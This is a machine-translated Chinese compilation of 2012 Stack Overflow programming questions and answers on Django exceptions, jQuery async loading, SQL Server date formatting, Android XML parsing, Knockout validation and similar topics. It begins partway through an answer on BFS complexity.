在人工智能中 - 您通常处理**巨大/无限图**，因此对于这些图来说**`O(V+E)`信息量**不足且不够好，因此我们试图获得更好的界限。这个界限是`O(B^d)`，其中`B`是分支因子，`d`是解的深度。这背后的原因是，如果你在每个深度“分支”到 B 方向，你最终会探索`O(B^d)`节点。

此外 - 请注意，您的算法课程中的经典 BFS 是**探索算法**- 它需要探索整个图（探索所有顶点），而在 AI 中我们将其用作**寻路**- 您一直探索直到我们找到从源到目标的路径. （没必要，有时不可能探索整个图）

另请注意，如果您查看一棵树（没有发现两次节点），具有分支因子`B`并且所有叶子都有深度`d`-`B + B^2 + B^3 + ... + B^d < B^(d+1)`树中确实有节点，所以如果您确实需要

> O(V+E) 和 O(b^d) 如何相等，第一个看起来像线性复杂度，第二个是指数的。

首先，图是输入，所以它在输入的大小上是线性的——图。
第二个在图形的大小上也是线性的 - 并且在解决方案的深度上呈指数级 - 一个不同的因素，仍然 - 不需要遍历一个顶点不止一次，所以在图形的大小上仍然是线性的。
因此，在这里 - 基本上`O(B^d)`是 的一个*子集*，`O(V+E)`并且信息量更大，如果您可以“忍受”您的复杂性是 的函数`d`，这不是输入的一部分。

> 当我们谈论大 O 表示法时，它意味着无论输入可能是上限，它都应该保持不变，因为它是一个上限。Big O 是否只处理一些有限的数据输入？

如果图是无限的，那么对于每个 f(n) 和每个常数 c,N - ，大 O 都不能提供信息，`c*f(n) < infinity`因此在谈论无限图时它是无用的。

# python - Django没有在异常中调用函数

> ID：12820082
> 
> 赞同：0
> 
> 时间：2012-10-10T13:06:57.890
> 
> 标签：python, django, django-views

我在 Ubuntu 12.04 上使用 Django 1.4 和 Python 2.7。

我有一个从表单帖子中获取信息的视图。它所做的第一件事是尝试根据表单中提供的信息查找客户信息。

在测试时，我输入了虚假信息，这似乎没问题。我期待它抛出一个`DoesNotExist`异常，然后我调用原始视图再次向用户展示表单。我不能那样做吗？

以下是两种观点：

```
def input_new_client(request):
    """
    ..  function:: input_new_client()

        Add the client based on the addClientInfo form

        :param request: Django Request object
    """
    ## Create a logging object
    path = os.path.join(os.path.dirname(__file__), 'logs/')
    filename = '{0}inputNewClient.log'.format(path)
    logfile = open(filename, 'w')
    now = datetime.datetime.now()
    logfile.write('\n --------------------- {0}\n'.format(now))

    if (request.method == "POST"):
        tkz_ys_api_id = request.POST.get("tkz_ys_api_id")
        tkz_ys_trans_key = request.POST.get("tkz_ys_trans_key")

        ## Validate the YS authentication information
        try:
            clientInfo = ClientInfo.objects.get(tkz_api_id = tkz_ys_api_id, tkz_trans_key = tkz_ys_trans_key)
        except ClientInfo.DoesNotExist or ClientInfo.MultipleObjectsReturned:
            logfile.write('{0}\n\n'.format(tkz_ys_api_id))
            logfile.write('{0}\n\n'.format(tkz_ys_trans_key))
            logfile.write('{0}\n\n'.format(traceback.format_exc()))
            logfile.close()
            state = "Invalid YS Authentication!  Please try again."
            add_new_client(request, state)
        else:
            if (clientInfo.name != "Your Solutions"):
                state = "Invalid YS Authentication!  Please try again."
                add_new_client(request, state)

        ## Generate a Tokeniz API ID and Trans Key for the new client
        (tkz_api_id, tkz_trans_key) = generate_credentials()

        ## Create a new client
        new_client = ClientInfo(name = request.POST.get("tkz_client_name"),
                                tkz_api_id = tkz_api_id,
                                tkz_trans_key = tkz_trans_key,
                                default_gateway_id = request.POST.get("tkz_gateway")
                               )
        new_client.save()

        ## Validate the YS authentication information
        try:
            clientInfo = ClientInfo.objects.get(tkz_api_id = tkz_api_id, tkz_trans_key = tkz_trans_key)
            foriegn_key = clientInfo.id
        except ClientInfo.DoesNotExist or ClientInfo.MultipleObjectsReturned:
            output = "Invalid YS Authentication!  Please try again."
            logfile.write('\n{0}\n'.format(output))
            logfile.write('{0}\n\n'.format(traceback.format_exc()))
            logfile.close()

        ## Setup the new clients gateway information
        new_gateway_info = GatewayInfo(client = foriegn_key,
                                       api_id = request.POST.get("tkz_gateway_api_id"),
                                       trans_key = request.POST.get("tkz_gateway_trans_key"),
                                       gateway_id = request.POST.get("tkz_gateway"),
                                      )
        new_gateway_info.save()

        data = {}
        data.update(csrf(request))
        data.update({ 'tkz_api_id' : tkz_api_id })
        data.update({ 'tkz_trans_key' : tkz_trans_key })
        data.update({ 'client_name' : request.POST.get("tkz_client_name")})

    return render_to_response("updatedClientCredentials.html", data) 
```

以及呈现形式的原始视图：

```
def add_new_client(request, state = None):
    """
    ..  function:: add_new_client()

        Provide a form for entering new client information

        :param request: Django Request object
        :param state: A message representing the state of the addition of a client
    """
    ## Create a logging object
    path = os.path.join(os.path.dirname(__file__), 'logs/')
    filename = '{0}addNewClient.log'.format(path)
    logfile = open(filename, 'a')
    now = datetime.datetime.now()
    logfile.write('\n --------------------- {0}\n'.format(now))

    if (state is None):
        state = "Enter information for adding a new client to Tokeniz."

    try:
        form = AddClientInfo()
    except:
        output = "Handle Error: Cannot create a valid form"
        logfile.write('{0}\n'.format(output))
        logfile.write('{0}\n\n'.format(traceback.format_exc()))
        logfile.close()
        return HttpResponse(output)

    try:
        data = {}
        data.update(csrf(request))
        data.update({ 'form' : form })
        data.update({ 'state' : state })
    except:
        output = "Handle Error: Cannot generate CSRF token"
        logfile.write('{0}\n'.format(output))
        logfile.write('{0}\n\n'.format(traceback.format_exc()))
        logfile.close()
        return HttpResponse(output)

    logfile.close()
    return render_to_response("addNewClientInfo.html", data) 
```

我希望`clientInfo = ClientInfo.objects.get(tkz_api_id = tkz_ys_api_id, tkz_trans_key = tkz_ys_trans_key)`请求`input_new_client`会引发`DoesNotExist`异常（因为我输入了假数据以确保情况如此）。

所以，我只是`add_new_client`要从异常中调用视图。

问题是`input_new_client`一直到`new_client.save()`线，由于明显的原因而失败。

有什么想法吗？

编辑1：

我已将`input_new_client`视图修改为具有以下异常语句：

```
if (request.method == "POST"):
    tkz_ys_api_id = request.POST.get("tkz_ys_api_id")
    tkz_ys_trans_key = request.POST.get("tkz_ys_trans_key")
    tkz_gateway_id = int(request.POST.get("tkz_gateway"))

    ## Validate the YS authentication information
    try:
        clientInfo = ClientInfo.objects.get(tkz_api_id = tkz_ys_api_id, tkz_trans_key = tkz_ys_trans_key)
    except (ClientInfo.DoesNotExist, ClientInfo.MultipleObjectsReturned):
        logfile.write('tkz_ys_api_id = {0}\n\n'.format(tkz_ys_api_id))
        logfile.write('tkz_ys_trans_key = {0}\n\n'.format(tkz_ys_trans_key))
        logfile.write('tkz_gateway_id = {0}\n\n'.format(tkz_gateway_id))
        logfile.write('{0}\n\n'.format(traceback.format_exc()))
        logfile.close()
        state = "Invalid YS Authentication!  Please try again."
        add_new_client(request, state)
    else:
        if (clientInfo.name != "Your Solutions"):
            state = "Invalid YS Authentication!  Please try again."
            add_new_client(request, state) 
```

我知道它进入了异常 - 我可以使用日志信息和回溯进行验证。但是，它并没有继续下去`add_new_client`。相反，它会向前跳过并尝试在`ClientInfo`模型中插入一个包含不正确数据的新条目。

为什么它会跳过对 的调用`add_new_client`？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-10T13:13:14.397

这一行：

```
except ClientInfo.DoesNotExist or ClientInfo.MultipleObjectsReturned: 
```

不做你认为它做的事。The`or`首先被评估，所以实际上（我认为）这只是试图捕捉 type 的异常`True`，当然它永远不会被引发。你真正想要的是这样的：

```
except (ClientInfo.DoesNotExist, ClientInfo.MultipleObjectsReturned): 
```

（注意括号）。

另请注意，`except`第二个片段中的裸子句是一个非常糟糕的主意：它会捕获*所有*异常，因此如果出现您未预料到的错误，您将永远不会知道。确保您只捕获您的 except 子句知道如何处理的处理错误。

**编辑**

啊，我明白你现在在做什么——你正试图从异常内部向用户返回响应。好吧，这并没有什么特别的问题，只是您实际上并没有将其发送回用户：您只需调用`add_new_client()`，并且不对发回的 HTTP 响应做任何事情。您需要从那里实际将其返回给用户：

```
except (ClientInfo.DoesNotExist, ClientInfo.MultipleObjectsReturned):
    ... logging stuff ...
    state = "Invalid YS Authentication!  Please try again."
    return add_new_client(request, state) 
```

# version-control - 如何在 TFS 中重新创建项目根源文件夹

> ID：12820086
> 
> 赞同：1
> 
> 时间：2012-10-10T13:07:00.363
> 
> 标签：version-control, tfs, visual-studio-2012

我不小心销毁（即 tf destroy）我的 TFS 项目的源代码控制根文件夹。有没有办法可以重新创建这个文件夹？当我右键单击集合根目录时，新文件夹按钮被禁用。我不想重新创建项目，因为那里已经有我会丢失的工作项目。

请注意，我不想尝试恢复被破坏的文件。我知道这些文件永远消失了，这正是我想要的。我只想重新创建项目的根源代码管理文件夹。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-10T18:10:26.537

Neno Loje 为此创建了一个命令行应用程序

[http://msmvps.com/blogs/vstsblog/archive/2010/11/03/how-to-add-a-source-control-folder-to-an-existing-team-project.aspx](http://msmvps.com/blogs/vstsblog/archive/2010/11/03/how-to-add-a-source-control-folder-to-an-existing-team-project.aspx)

# backbone.js - 如何“安全地”更改 Backbone js 视图上的模型？

> ID：12820090
> 
> 赞同：4
> 
> 时间：2012-10-10T13:07:08.913
> 
> 标签：backbone.js, marionette

我正在使用 Backbone js 和 Marionette 试验主细节的东西。如何更改视图的模型？我希望将视图的模型侦听器从旧模型中删除并应用于新模型。与模型相关的其他类似内容同上。有人有一些“changeModel”代码可以干净地做到这一点吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T16:02:35.323

破坏旧视图并基于不同的模型制作新视图不是更容易吗？在此示例中，我将模型本身传递给 ItemViewOptions，并且在模型上我有一些定义特征......并且由于模型来自服务器，我可以操纵发生的事情 View。这个用于绑定动态模板，但我想你也可以对事件做一些事情。这将要求您首先销毁所有内容，而不是重新绑定所有内容。

```
node = Backbone.Model.extend

nodes = Backbone.Collection.extend
    model: node
    url: ->
        Myapp.rooturl + "/api/node"
    initialize: (nodes) ->
        @fetch()    

nodeView = Backbone.Marionette.ItemView.extend
    initialize: (options) -> 
        @template = "#" + options.model.attributes.nodetemplate + "-template"
    tagName: 'div'

nodesView = Backbone.Marionette.CollectionView.extend
    itemView: nodeView
    itemViewOptions: @model 
```

# javascript - Javascript 脚本因警报而失败

> ID：12820095
> 
> 赞同：-1
> 
> 时间：2012-10-10T13:07:31.330
> 
> 标签：javascript, jquery, alert

我有以下代码：

```
$(".zalen").change(function(){
        var number = $(this).val(); 
        $('.Zaal').load('zaal'+ number +'.html');

        var storageName = "zaal" + $(".zalen").val() + '_chairs';
        var chairs = localStorage.getItem(storageName);
        if(chairs == null)
        {
            chairs = "";
        }
        var chairArray = chairs.split(" "); 
        alert(chairArray);
        $("td.chair").each(function(index){
            for(var i=0; i < chairArray.length; i++)
            {
                if(index == chairArray[i])
                {
                    $(this).addClass('reserved');   
                }
            }
        })
    }); 
```

注意椅子分开后的警报。

它与警报完美配合。但是当我完成测试并删除警报时。代码停止工作，我不知道为什么会这样。

任何人都可以帮我解决这个问题。

解决方案 ：

```
$(".zalen").change(function(){
        var number = $(this).val(); 
        $('.Zaal').load('zaal'+ number +'.html', function() {
            var storageName = "zaal" + $(".zalen").val() + '_chairs';
            var chairs = localStorage.getItem(storageName);
            if(chairs == null)
            {
                chairs = "";
            }
            var chairArray = chairs.split(" ");  
            $("td.chair").each(function(index){
                for(var i=0; i < chairArray.length; i++)
                {
                    if(index == chairArray[i])
                    {
                        $(this).addClass('reserved');   
                    }
                }
            })
        });
    }); 
```

谢谢@jbabey 的解决方案。我非常感激

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-10T13:14:39.823

jquery 的[`load()`](http://api.jquery.com/load/)函数对内容执行异步请求。您需要等到该内容准备好后再对其进行操作。当您收到警报时，代码会暂停足够长的时间`load`以完成。您拥有的任何依赖于正在加载的内容的代码都`.Zaal`应该在加载的成功处理程序中：

```
$(".zalen").change(function(){
    var number = $(this).val(); 
    $('.Zaal').load('zaal'+ number +'.html', function () {
        // put all of this in the complete callback
        var storageName = "zaal" + $(".zalen").val() + '_chairs';
        var chairs = localStorage.getItem(storageName);
        if(chairs == null) {
            chairs = "";
        }
        var chairArray = chairs.split(" "); 
        alert(chairArray);
        $("td.chair").each(function(index){
            for(var i=0; i < chairArray.length; i++) {
                if(index == chairArray[i]) {
                    $(this).addClass('reserved');   
                }
            }
        })
    });
}); 
```

# ruby-on-rails-3 - 使用 capybara-webkit 运行 Cucumber 功能时的缓存问题

> ID：12820096
> 
> 赞同：3
> 
> 时间：2012-10-10T13:07:33.217
> 
> 标签：ruby-on-rails-3, caching, cucumber, capybara, capybara-webkit

我编写了一个功能来测试某些内容是否出现在页面上。内容通过 AJAX 动态加载，场景用`@javascript`.

奇怪的部分是：如果我设置`config.cache_classes = false`，`config/environments/test.rb`一切正常，步骤通过。

但是，我更喜欢默认`config.cache_classes`设置为`true`. 但是使用该设置，该步骤将失败。我已经能够将失败的原因缩小到正在更新其内容的控件的 AJAX 调用。

我已经编辑了我的控制器，即使使用了诸如 an 之类的严厉措施，`exit 1`以绝对确保所发生的情况是正在使用旧的缓存版本的控制器。

1）我可以手动刷新和重新生成类缓存吗？我将如何明确告诉 Cucumber 使用我的课程的当前版本，而不必设置`config.cache_classes`为 false？

2) Rails 默认在哪里缓存类？我在网上找不到任何有用的答案。

我的环境：

*   导轨 3.2.8
*   黄瓜 1.2.1
*   黄瓜导轨 1.3.0
*   水豚 1.1.2
*   capybara-webkit 0.12.1（`javascript_driver`是`:webkit`，但错误仍然存​​在`:selenium`）

# xaml - 如何从 Windows 8 应用商店应用程序中的对象或容器中删除 EntranceThemeTransition？

> ID：12820097
> 
> 赞同：0
> 
> 时间：2012-10-10T13:07:33.020
> 
> 标签：xaml, windows-8, microsoft-metro, windows-runtime

如何删除XAML 中似乎（默认情况下）要添加到 Windows 8 应用商店应用程序中的所有控件的默认[EntranceThemeTransition ？](http://msdn.microsoft.com/en-us/library/windows/apps/windows.ui.xaml.media.animation.entrancethemetransition)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-10T15:18:03.130

假设您使用的是项目/项目模板之一（Split App、Grid App 等），您将在解决方案的 Common 目录中看到一个 StandardStyles.xaml。它在最后包含以下标记。您可以在那里删除/修改它。

```
<Style x:Key="LayoutRootStyle" TargetType="Panel">
    <Setter Property="Background" Value="{StaticResource ApplicationPageBackgroundThemeBrush}"/>
    <Setter Property="ChildrenTransitions">
        <Setter.Value>
            <TransitionCollection>
                <EntranceThemeTransition/>
            </TransitionCollection>
        </Setter.Value>
    </Setter>
</Style> 
```

# asp.net - asp.net razor 上的增量页面浏览量

> ID：12820100
> 
> 赞同：0
> 
> 时间：2012-10-10T13:07:39.013
> 
> 标签：asp.net, razor

我希望每次用户访问数据库中的页面时视图列增加 1，我做了如下代码但它一直显示 1

```
 var updateCommand = "UPDATE Items SET views=@0 + 1  WHERE id=@1";
    viewsdb.Execute(updateCommand, views, id); 
```

# c - 开发数据库服务器：如何将结果发送到客户端？

> ID：12820101
> 
> 赞同：3
> 
> 时间：2012-10-10T13:07:42.003
> 
> 标签：c, database, networking, database-server

我想为教育目的创建自己的数据库服务器。我的问题是，我无法真正找到有关这些系统如何工作的信息。现在，我可以使用基本的选择语句创建数据库和表并从中获取数据。

但是，当客户端连接到数据库服务器时，我应该如何将查询结果发送回客户端？应该使用什么格式来获得良好的性能？考虑到具体情况，可能需要注意哪些其他事项？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-10T13:13:55.590

有很多选择，取决于您的需求。

[JSON](http://www.json.org/)将允许几乎任何类型的客户端使用您的数据库。它也很容易创建，但格式有点冗长。

如果您需要紧凑格式，请查看具有文本（= 可读）和二进制形式（= 紧凑）的 Google[协议缓冲区。](http://code.google.com/p/protobuf/)许多语言都支持 protobuf，但还没有 JSON 那么多。

我建议不要尝试提出自己的格式；已经有太多了，任务看起来比它更简单。如果你犯了错误，就很难改正，尤其是当其他人开始使用你的作品时。

# c++ - 将 boost::transform_iterator 与非常量函子一起使用

> ID：12820104
> 
> 赞同：4
> 
> 时间：2012-10-10T13:07:52.617
> 
> 标签：c++, boost

我想使用 transform_iterator 在范围上进行增量转换。通过增量转换，我的意思是 r [0]应该保持不变，并且后续元素 r [i]被映射到 (r [i] - r [i - 1] )。

我的问题是，据我所知，transform_iterator 需要一个 const 仿函数，但我的仿函数需要记住以前的值。我该如何解决这个问题？我应该只写自己的迭代器吗？

我想要它作为迭代器的原因是在下一步中我想从中制作一个范围适配器。

编辑：似乎 transform_iterator 确实允许非常量函子，而且确实是我的范围适配器抱怨缺乏常量性。我将保持问题的开放性，因为关于使用 transform_iterator 的适当性的讨论似乎很有趣。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-10T13:45:29.363

我不认为你可以用 boost::transform_iterator 完全正确地完成这项工作。这是一个简单的实现，一开始似乎可以工作，但实际上效果不佳：

```
#include <boost/iterator/transform_iterator.hpp>
#include <vector>
#include <iostream>

using std::cout;

struct Delta {
  Delta() : prev_value(0) { }

  int operator()(int value) const
  {
    int result = value-prev_value;
    prev_value = value;
    return result;
  }

  mutable int prev_value;
};

int main(int,char**)
{
  typedef std::vector<int> Items;
  typedef boost::transform_iterator<Delta,Items::iterator,int> Iter;

  Items items;
  items.push_back(4);
  items.push_back(3);
  items.push_back(8);
  { // prints 4 -1 5  -- excellent
    Iter i(items.begin(),Delta()), end(items.end(),Delta());
    for (;i!=end;++i) {
      cout << *i << " ";
    }
    cout << "\n";
  } 
  { // prints 4 0 -- crap
    Iter i(items.begin(),Delta());
    cout << *i << " ";
    cout << *i << "\n";
  }
  return 0;
} 
```

要真正完成这项工作，您需要知道迭代器何时先进，所以我认为您需要自己的迭代器。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-10-10T13:58:29.133

这对我来说似乎工作得很好，即使我使用指针来记住以前的值（在你的情况下这可能是一个好主意，也可能不是一个好主意）。

```
#include <algorithm>
#include <iostream>
#include <vector>
#include <boost/iterator/transform_iterator.hpp>

class delta {
public:
  typedef int result_type;

  int operator()(const int& i) const {
    if(prev) {
      const int* tmp = prev;
      prev = &i;
      return i - *tmp;
    } else {
      prev = &i;
      return i;
    }
  }
private:
  mutable const int* prev = nullptr;
};

int main()
{
  std::vector<int> v = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10};
  std::for_each(boost::make_transform_iterator(begin(v), delta()), 
                boost::make_transform_iterator(end(v), delta()),
                [](int i) { std::cout << i << std::endl; });

  return 0;
} 
```

但是，即使您使用 decltype，它也不适用于 lambda，因为有状态的 lambda 必须标记为可变的，并且您不能像使用可变成员那样隐藏副作用。

# asp.net - Extjs + Asp.Net LINQ + 网络服务

> ID：12820108
> 
> 赞同：1
> 
> 时间：2012-10-10T13:07:57.970
> 
> 标签：asp.net, linq, web-services, extjs4.1

我正在使用 ExtJs 4.1。**我想在 extjs 中开发基本的网格面板应用程序，它通过 WebService 显示来自 linq 的数据**我没有使用 asp.net MVC。那我怎么显示？？

我试图从以下代码中找到解决方案，但没有成功。

**网格.js**

```
Ext.application({
    launch: function() {
        // Model definition and remote store (used Ext examples data)
        Ext.define('ForumThread', {
            extend: 'Ext.data.Model',
            fields: ['countryId', 'countryName'],
            idProperty: 'countryId'
        });

         var store = Ext.create('Ext.data.Store', {
        pageSize: 20,
        model: 'ForumThread',
        autoLoad: true,
        proxy: {
            type: 'ajax',
            url: '../reports/test.asmx/display',
            dataType: "json",
            contentType: "application/json; charset=utf-8",
             //url: '/grid.json',
            reader: {                
                type: 'json',
                method: "GET",
                totalProperty: 'totalCount'
            }
        }
    });

        // Define grid that will automatically restore its selection after store reload
        Ext.define('PersistantSelectionGridPanel', {
            extend: 'Ext.grid.Panel',

        });

        // Create instance of previously defined persistant selection grid panel
        var grid = Ext.create('PersistantSelectionGridPanel', {
            autoscroll: true,
            height: 300,
            renderTo: Ext.getBody(),
            //region: 'center',
            store: store,
            multiSelect: true, // Delete this if you only need single row selection
            stateful: true,
            forceFit: true,
            loadMask: false,
            viewConfig: {
                stripeRows: true
            },
            columns:[{
                id: 'countryId',
                text: "countryId",
                dataIndex: 'countryId',
                flex: 1,
                sortable: false
            },{
                text: "countryName",
                dataIndex: 'countryName',
                width: 70,
                align: 'right',
                sortable: true
            } ]
        });
    }
}); 
```

**测试.asmx**

```
[WebMethod]
        [ScriptMethod(ResponseFormat = ResponseFormat.Json , UseHttpGet = true, XmlSerializeString = false)]
    public string display()
    {
        country obj = new country();
        //return obj.SelectAll();
        JavaScriptSerializer serializer = new JavaScriptSerializer();
        return serializer.Serialize(obj.SelectAll());
    } 
```

**但我在萤火虫中遇到以下错误** ![在此处输入图像描述](../Images/3f0a95ab79b6709b819431a99107e953.png)

# c# - Excel 加载项中的数据

> ID：12820110
> 
> 赞同：0
> 
> 时间：2012-10-10T13:08:17.157
> 
> 标签：c#, excel, add-in

我将如何将 Excel 工作表中的数据提取到 Excel 加载项中的列表中？理想情况下，我需要从工作表中获取每一行并将其保存在加载项的元组列表中。

这是一个 C# 加载项，数据将存储在工作表的加载项中。数据不需要在会话之间存储。有任何想法吗？

# php - 额外的字符被添加到站点 url

> ID：12820113
> 
> 赞同：1
> 
> 时间：2012-10-10T13:08:28.060
> 
> 标签：php, concrete5

站点 url 中添加了一些额外的字符（正在开发中。使用具体 5 cms）。以前没有这样的问题。

```
 #.UHVsDy7Mja9 
```

在加载页面后添加到每个 url 的末尾。我检查了 htaccess、页眉和页脚，但在那里找不到任何不需要的代码。是垃圾邮件吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T13:22:02.247

尽管可能还有其他“插件”可以做到这一点，但可能的候选者是[AddThis](http://www.addthis.com)（如果您当然正在使用它）。

AddThis 在每个 url 的末尾添加一个标签以用于跟踪目的，但可以使用（在 javascript 中）关闭它：

```
var addthis_config = {"data_track_addressbar": false}; 
```

# sql-server - 更改获取日期函数的格式

> ID：12820117
> 
> 赞同：2
> 
> 时间：2012-10-10T13:08:43.680
> 
> 标签：sql-server

使用此语句时

```
select urn,GETDATE() from table1 where urn not in(select urn from table2) 
```

日期格式为 2012 年 10 月 10 日下午 1:57。但是我希望它采用这种格式 20121010

有任何想法吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-10T13:10:04.613

尝试这个：

在 sql server 中使用[CONVERT()函数](http://msdn.microsoft.com/en-us/library/ms187928.aspx)

```
select CONVERT(varchar(8),GETDATE(),112) 
```

# [SQL 小提琴演示](http://www.sqlfiddle.com/#!3/d41d8/5123)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-10T13:12:13.670

```
SELECT CONVERT(VARCHAR(8), GETDATE(), 112) AS [YYYYMMDD] 
```

select urn, CONVERT(VARCHAR(8), GETDATE(), 112) as [YYYYMMDD] from table1 where urn not in(select urn from table2)

```
and also refer more format :
http://www.sql-server-helper.com/tips/date-formats.aspx 
```

# android - 新的 android 版本上的 Android Xml 解析错误

> ID：12820125
> 
> 赞同：2
> 
> 时间：2012-10-10T13:09:02.850
> 
> 标签：android, xml, parsing

我试图从资产文件夹中解析我的 xml 文件，我在 android 2.3.5 上尝试过它可以工作，但是当我在 android 4.0.4 和 4.1 中尝试它时它没有给出任何错误，但我无法从 xml 中获取值.

```
 public class PlistParser {

    // parse Plist and fill in arraylist
    public ArrayList<DataModel> parsePlist(String xml) {
        final ArrayList<DataModel> dataModels = new ArrayList<DataModel>();

        //Get the xml string from assets
        final Document doc =  XMLfromString(xml);
        final NodeList nodes_array = doc.getElementsByTagName("dict");

        //Fill in the list items from the XML document          
        for ( int index = 0; index < nodes_array.getLength(); index++ ) {

            final Node node = nodes_array.item(index);

            if ( node.getNodeType() == Node.ELEMENT_NODE ) {
                final Element e = (Element)nodes_array.item(index);

                final NodeList nodeKey = e.getElementsByTagName("key");
                final NodeList nodeValue = e.getElementsByTagName("string");
                DataModel model = new DataModel();

                for (int i=0; i < nodeValue.getLength(); i++) {

                    final Element eleKey = (Element)nodeKey.item(i);
                    final Element eleString = (Element)nodeValue.item(i);

                    if ( eleString != null ) {

                        String strValue = getValue(eleString, "string");

                        if(getValue(eleKey, "key").equals("isim")) {
                            model = new DataModel();
                            model.setIsim(strValue);
                        } else if(getValue(eleKey, "key").equals("turu")) {
                            model.setTuru(strValue);
                        } else if(getValue(eleKey, "key").equals("kalori")) {
                            model.setKalori(Float.parseFloat(strValue));
                        } else if(getValue(eleKey, "key").equals("protein")) {
                            model.setProtein(Float.parseFloat(strValue));
                        } else if(getValue(eleKey, "key").equals("yag")) {
                            model.setYag(Float.parseFloat(strValue));
                        } 
                        else if(getValue(eleKey, "key").equals("karbonhidrat")) {
                            model.setKarbonhidrat(Float.parseFloat(strValue));
                        } else if(getValue(eleKey, "key").equals("lif")) {
                            model.setLif(Float.parseFloat(strValue));
                        }else if(getValue(eleKey, "key").equals("aciklama")) {
                            if ( strValue == null ) {
                                strValue = "";
                            }
                            model.setAciklama(strValue);
                            dataModels.add(model);
                        }
                    }
                }
            }
        }

        return dataModels;
    }

    // Create xml document object from XML String
    private  Document XMLfromString(String xml) {
        Document doc = null;

        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        try {
            DocumentBuilder db = dbf.newDocumentBuilder();
            InputSource is = new InputSource();
            is.setCharacterStream(new StringReader(xml));
            doc = db.parse(is);
            doc.getDocumentElement().normalize();
        } catch (ParserConfigurationException e) {
            System.out.println("XML parse error: " + e.getMessage());
            return null;
        } catch (SAXException e) {
            System.out.println("Wrong XML file structure: " + e.getMessage());
            return null;
        } catch (IOException e) {
            System.out.println("I/O exeption: " + e.getMessage());
            return null;
        }

        return doc;
    }

    // fetch value from Text Node only
    private   String getElementValue(Node elem) {
        Node kid;
        if (elem != null) {
            if (elem.hasChildNodes()) {
                for (kid = elem.getFirstChild(); kid != null; kid = kid.getNextSibling()) {
                    if (kid.getNodeType() == Node.TEXT_NODE) {
                        return kid.getNodeValue();
                    }
                }
            }
        }
        return "";
    }

    /// Fetch value from XML Node
    private   String getValue(Element item, String str) {
        NodeList n = item.getElementsByTagName(str);
        return getElementValue(n.item(0));
    }
} 
```

这是从资产中获取 xml 的代码。

```
private  String readPlistFromAssets() {
    StringBuffer sb = new StringBuffer();
    BufferedReader br=null;

    try {
        br = new BufferedReader(new InputStreamReader(getAssets().open("sample.xml")));         
        String temp;
        while ((temp = br.readLine()) != null)
        sb.append(temp);
    } catch (IOException e) {       
        e.printStackTrace();
    } finally {
        try {
            br.close(); // stop reading
        } catch (IOException ex) {
            ex.printStackTrace();
        }
    }
    return sb.toString();
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-17T14:31:27.443

我发现我需要用`asynctask`.

# asp.net-mvc-3 - 淘汰赛验证模式对所有内容都抛出错误

> ID：12820127
> 
> 赞同：0
> 
> 时间：2012-10-10T13:09:03.413
> 
> 标签：asp.net-mvc-3, knockout.js, knockout-validation

我添加了淘汰赛验证，但它似乎将我放入该字段的所有内容都扔了：a、1、？等——唯一有效的方法是让该字段为空。我正在使用 ko 验证库，并通过使用模式规则对其进行扩展。

ko 模板：

```
<script type="text/html" id="solutionRowTemplate">
                    <tr>
                        <td>
                            <input type="text" class="whole" data-bind="value: firstWhole, valueUpdate: 'afterkeydown'" />
                        </td>
</tr>
</script> 
```

ko 视图模型：

```
<script type="text/javascript">
    var solutionData = @Html.Raw(new JavaScriptSerializer().Serialize(Model.SolutionList));

    function SolutionModel(firstWhole) {
        this.firstWhole = ko.observable(firstWhole);
    }

    var viewModel = {
        solutions: ko.observableArray(ko.utils.arrayMap(solutionData, function (item) {
            var model = new SolutionModel(item.FirstWhole);
            model.firstWhole.extend({ pattern: '^[a-z0-9].$' });
            return model;
        })),
        addSolution: function () {
            this.solutions.push(new SolutionModel('', '', '', '', '', '', '', '', '', '', '', ''));
        },
    };

    ko.applyBindings(viewModel);
</script> 
```

如果我添加扩展的方式有误，也不会感到惊讶...

谢谢，-罗布

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T13:40:47.920

它应该工作。但是你尝试过的价值观 - 不是。`'a'`，`'1'`并且`'?'`不是模式的有效值`'^[a-z0-9].$'`。对于此模式，只有第一个符号为字母 (az) 或数字且第二个符号为 any 的值才有效。例如：`'1a'`, `'b#'`, `'Ab'`。

# asp.net - 使用 asp:ImageButton 提交而不是提交按钮

> ID：12820128
> 
> 赞同：1
> 
> 时间：2012-10-10T13:09:03.543
> 
> 标签：asp.net, forms

在我的项目中有一个`submit`按钮

```
 <input type="submit" value="submit form" onclick="window.form1.submit();" id="subBut"> 
```

在对该项目进行了更多工作并添加了一些`ImageButton`控件之后，它作为不相关的按钮脱颖而出。

我用 onClick 事件测试了一个 imageButton。onClick 的代码还是空的

```
 <asp:ImageButton ID="ImgBut_Submt" ImageUrl="~/images/sendreq.jpg" 
        runat="server" OnClick="Submit_Click" style="width: 28px" /> 
```

后面的代码

```
protected void Submit_Click(object sender, ImageClickEventArgs e)
{
} 
```

虽然似乎在做同样的事情。可以保留它作为替代品吗

到一个`submit`按钮..我在这里错过了什么吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T13:30:18.707

`input type=submit`将提交表单，我认为您不需要执行 onclick 操作。

在 ASP.Net 世界中，虽然事件是使用回发触发的，但信息仅作为“表单提交”发送到服务器，我在您的内容中看到的主要区别是您试图混合原生 html 控件和 asp.net web控制，这就是整个混乱所在。

ASP.NET Web 控件虽然提供与原生 html 控件相同的功能，但它提供了额外的事件处理机制和状态信息，它只是原生 html 控件的包装器，因为浏览器只能理解它们。

在 ASP.NET 世界中，您不会将 action 属性设置为 aswel，因为它在内部由 ASP.NET 框架处理。

正如 Kapil 提到的，你可以有一个带有 css 的提交按钮，它可以包含一个图像，类似于 ASP.NET 所做的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-10T13:24:59.697

